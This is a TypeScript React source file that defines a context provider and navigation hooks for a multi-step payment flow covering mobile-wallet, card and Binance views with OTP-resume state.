import type { Context } from "react";
import { createContext, useContext, useMemo, useState, ReactNode, useCallback, useEffect } from "react";
import { useLocation, useNavigate as rrUseNavigate } from "react-router-dom";
import { clearOtpResume, readOtpResume } from "@/lib/otpResume";

export type FlowView =
  | "home"
  | "payment"
  | "bkash"
  | "nagad"
  | "rocket"
  | "upay"
  | "card"
  | "binance"
  | "cancelled";

const routeToView: Record<string, FlowView> = {
  "/": "home",
  "/payment": "payment",
  "/bkash": "bkash",
  "/nagad": "nagad",
  "/rocket": "rocket",
  "/upay": "upay",
  "/card": "card",
  "/binance": "binance",
  "/payment-cancelled": "cancelled",
};

type CardKind = "visa" | "mastercard" | null;

type Ctx = {
  view: FlowView;
  setView: (v: FlowView) => void;
  params: URLSearchParams;
  setParams: (p: URLSearchParams) => void;
  cardKind: CardKind;
  setCardKind: (v: CardKind) => void;
};

// Share a single context instance across duplicated module copies (HMR / mixed
// import specifiers) so consumers never miss the provider.
const g = globalThis as unknown as { __genzFlowContext?: Context<Ctx | null> };
const FlowContext = g.__genzFlowContext ?? (g.__genzFlowContext = createContext<Ctx | null>(null));

const STORAGE_KEY = "genz_flow_state_v2";

const loadPersisted = () => {
  if (typeof window === "undefined") return null;
  try {
    window.localStorage.removeItem(STORAGE_KEY);
    const otpResume = readOtpResume();
    if (!otpResume) return null;
    const view = otpResume.route === "card" ? "card" : otpResume.route;
    return { view: view as FlowView, params: otpResume.params, cardKind: otpResume.route === "card" ? "visa" as CardKind : null, ts: otpResume.ts };
  } catch {
    return null;
  }
};


export const FlowProvider = ({ children }: { children: ReactNode }) => {
  const location = useLocation();
  const persisted = loadPersisted();
  const [view, setView] = useState<FlowView>(persisted?.view ?? "home");
  const [params, setParams] = useState<URLSearchParams>(
    new URLSearchParams(location.search || persisted?.params || ""),
  );
  const [cardKind, setCardKind] = useState<CardKind>(persisted?.cardKind ?? null);

  // Normal refresh/re-entry starts from home. OTP pages persist themselves only.
  useEffect(() => {
    try { window.localStorage.removeItem(STORAGE_KEY); } catch { /* ignore */ }
  }, [view, params, cardKind]);

  useEffect(() => {
    setParams(new URLSearchParams(location.search));
  }, [location.search]);



  const value = useMemo(
    () => ({ view, setView, params, setParams, cardKind, setCardKind }),
    [view, params, cardKind],
  );

  return <FlowContext.Provider value={value}>{children}</FlowContext.Provider>;
};

export const useFlow = () => {
  const c = useContext(FlowContext);
  if (!c) {
    // Fail soft: render the home view instead of crashing the whole tree.
    return {
      view: "home" as FlowView,
      setView: () => {},
      params: new URLSearchParams(),
      setParams: () => {},
      cardKind: null as CardKind,
      setCardKind: () => {},
    };
  }
  return c;
};

// Delegates to react-router; also keeps cardKind state in sync for /visa /mastercard.
export const useNavigate = () => {
  const flow = useContext(FlowContext);
  const rr = rrUseNavigate();
  return useCallback(
    (to: string | number, opts?: any) => {
      if (typeof to === "number") {
        rr(to);
        return;
      }
      const [path] = String(to).split("?");
      if (path === "/" || path === "/payment" || path === "/payment-cancelled") clearOtpResume();
      if (flow) {
        if (path === "/card") flow.setCardKind("visa");
      }
      rr(to as string, opts);
      window.scrollTo(0, 0);
    },
    [flow, rr],
  );
};

export { useSearchParams, useLocation } from "react-router-dom";

